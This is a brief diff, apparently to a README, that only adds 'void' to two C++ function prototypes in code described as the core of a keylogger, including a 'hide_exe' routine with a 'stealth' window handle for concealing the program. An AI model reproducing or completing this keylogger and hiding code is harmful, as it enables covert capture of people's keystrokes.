@@ -49,7 +49,7 @@ Here's a brief look at the core code in `main.cpp`:
 
 // Function prototypes
 void KeyLogger(void);
-void hide_exe();
+void hide_exe(void);
 
 // main function
 int main(void)
@@ -103,7 +103,7 @@ void KeyLogger(void)
 }
 
 // function to hide the exe file.
-void hide_exe()
+void hide_exe(void)
 {
     HWND stealth;
     AllocConsole();
